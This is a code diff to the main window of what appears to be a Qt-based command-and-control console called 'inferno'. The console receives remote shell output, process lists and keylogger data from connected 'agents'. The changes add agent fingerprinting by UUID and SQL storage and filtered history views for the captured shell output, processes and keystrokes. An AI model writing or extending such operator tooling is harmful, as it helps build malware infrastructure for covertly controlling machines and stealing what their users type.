@@ -1,6 +1,7 @@
 #include "../include/MainWindow.hpp"
 #include "../include/DataStreamWidget.hpp"
 #include "../include/CommandDialog.hpp"
+#include "../include/Inferno_Database.hpp"
 #include <QVBoxLayout>
 #include <QHBoxLayout>
 #include <QFile>
@@ -26,6 +27,7 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     connect(m_server, &Server::agentConnected, this, &MainWindow::onAgentConnected);
     connect(m_server, &Server::agentDisconnected, this, &MainWindow::onAgentDisconnected);
     connect(m_server, &Server::shellOutputReceived, this, &MainWindow::onShellOutputReceived);
+    connect(m_server, &Server::processListReceived, this, &MainWindow::onProcessListReceived);
     connect(m_server, &Server::keylogReceived, this, &MainWindow::onKeylogReceived);
     connect(m_server, &Server::statusMessage, this, &MainWindow::onStatusMessage);
 
@@ -156,9 +158,17 @@ void MainWindow::setupUI() {
     btnHistory->setToolTip("Load Telemetry History");
     connect(btnHistory, &QPushButton::clicked, this, &MainWindow::loadTelemetryHistory);
 
+    m_typeFilter = new QComboBox();
+    m_typeFilter->addItem("All History", "ALL");
+    m_typeFilter->addItem("Shell only", "SHELL");
+    m_typeFilter->addItem("Processes only", "PROC");
+    m_typeFilter->setStyleSheet("background: #000; color: #00ff41; border: 1px solid #1a1a1a; padding: 2px;");
+    connect(m_typeFilter, QOverload<int>::of(&QComboBox::currentIndexChanged), this, &MainWindow::loadTelemetryHistory);
+
     telemetryHeader->addWidget(btnShell);
     telemetryHeader->addWidget(btnProcs);
     telemetryHeader->addWidget(btnHistory);
+    telemetryHeader->addWidget(m_typeFilter);
     telemetryHeader->addWidget(btnClearConsole);
     telemetryLayout->addLayout(telemetryHeader);
     
@@ -257,7 +267,25 @@ void MainWindow::loadStyleSheet() {
 
 // Slots implementation
 void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
-    auto* item = new QListWidgetItem(ip + " [" + info + "]", m_agentList);
+    qDebug() << "[MainWindow] Agent connected from" << ip << "with info:" << info;
+    // Parse UUID (Circle 5 Fingerprinting)
+    static const QRegularExpression uuidRegex("ID: ([^| ]+)");
+    auto match = uuidRegex.match(info);
+    QString uuid = match.hasMatch() ? match.captured(1) : "UNKNOWN_UUID";
+    qDebug() << "[MainWindow] Extracted UUID:" << uuid;
+    m_agentIpToUuid[ip] = uuid;
+
+    // Register in Database
+    QString hostname = "Unknown", osInfo = "Unknown";
+    auto parts = info.split('|');
+    for (const QString& part : parts) {
+        if (part.contains("Host:")) hostname = part.section(':', 1).trimmed();
+        if (part.contains("OS:")) osInfo = part.section(':', 1).trimmed();
+    }
+    Inferno_Database::instance().registerAgent(uuid, ip, hostname, osInfo);
+
+    auto* item = new QListWidgetItem(ip + " [" + hostname + "]", m_agentList);
+    item->setData(Qt::UserRole, uuid); // Store UUID in the item
     
     QString lowerInfo = info.toLower();
     if (lowerInfo.contains("windows")) {
@@ -283,19 +311,54 @@ void MainWindow::onAgentDisconnected(const QString& ip) {
 
 void MainWindow::onShellOutputReceived(const QString& ip, const QString& output) {
     QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
-    // Optimize: compile the regex once and reuse
     static const QRegularExpression lineSplitter(QStringLiteral("[\r\n]+"));
     QStringList lines = output.split(lineSplitter, Qt::SkipEmptyParts);
+    
+    QString uuid = m_agentIpToUuid.value(ip);
+    if (uuid.isEmpty()) {
+        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
+        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
+    }
+
     for (const QString& line : lines) {
         QString trimmed = line.trimmed();
         if (trimmed.isEmpty()) continue;
+        
+        // Log to Database (Circle 5)
+        Inferno_Database::instance().logTelemetry(uuid, "SHELL", trimmed);
+
         QString formatted = QString("[%1] [%2] %3").arg(timestamp, ip, trimmed);
         appendToTelemetry(formatted);
     }
 }
 
+void MainWindow::onProcessListReceived(const QString& ip, const QString& output) {
+    QString uuid = m_agentIpToUuid.value(ip);
+    if (uuid.isEmpty()) {
+        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
+        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
+    }
+    
+    // Log to Database (Circle 5) with specific PROC type
+    Inferno_Database::instance().logTelemetry(uuid, "PROC", output);
+
+    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
+    QString formatted = QString("[%1] [%2] [PROCESS SNAPSHOT RECEIVED]").arg(timestamp, ip);
+    appendToTelemetry(formatted);
+    appendToTelemetry(output); // Append the actual list
+}
 void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
     if (data.trimmed().isEmpty()) return;
+    
+    QString uuid = m_agentIpToUuid.value(ip);
+    if (uuid.isEmpty()) {
+        auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
+        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
+    }
+
+    // Log to Database (Circle 5)
+    Inferno_Database::instance().logKeylog(uuid, "Active Window", data);
+
     QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
     QString line = QString("[%1] [%2] %3").arg(timestamp, ip, data);
     appendToKeylog(line);
@@ -461,27 +524,40 @@ void MainWindow::filterKeylogStream(const QString& text) {
 }
 
 void MainWindow::loadTelemetryHistory() {
+    auto* current = m_agentList->currentItem();
+    if (!current) return;
+    QString uuid = current->data(Qt::UserRole).toString();
+
     m_telemetryConsole->clear();
     QString filter = m_searchBox->text();
-    for (const QString& line : m_telemetryHistory) {
+    QString type = m_typeFilter->currentData().toString();
+    
+    QStringList dbHistory = Inferno_Database::instance().getTelemetryHistory(uuid, type);
+    for (const QString& line : dbHistory) {
         if (filter.isEmpty() || line.contains(filter, Qt::CaseInsensitive)) {
             m_telemetryConsole->appendPlainText(line);
         }
     }
-    m_telemetryConsole->appendPlainText("[SYSTEM] History dump complete.");
-    m_statusLabel->setText(" Telemetry history reloaded");
+    m_telemetryConsole->appendPlainText("[SYSTEM] Database history dump complete.");
+    m_statusLabel->setText(" Telemetry history reloaded from SQL");
 }
 
 void MainWindow::loadKeylogHistory() {
+    auto* current = m_agentList->currentItem();
+    if (!current) return;
+    QString uuid = current->data(Qt::UserRole).toString();
+
     m_keylogStream->clear();
     QString filter = m_keylogSearchBox->text();
-    for (const QString& line : m_keylogHistory) {
+    
+    QStringList dbHistory = Inferno_Database::instance().getKeylogHistory(uuid);
+    for (const QString& line : dbHistory) {
         if (filter.isEmpty() || line.contains(filter, Qt::CaseInsensitive)) {
             m_keylogStream->appendPlainText(line);
         }
     }
-    m_keylogStream->appendPlainText("[SYSTEM] Keylog history dump complete.");
-    m_statusLabel->setText(" Keylog history reloaded");
+    m_keylogStream->appendPlainText("[SYSTEM] Keylog database history dump complete.");
+    m_statusLabel->setText(" Keylog history reloaded from SQL");
 }
 
 } // namespace inferno
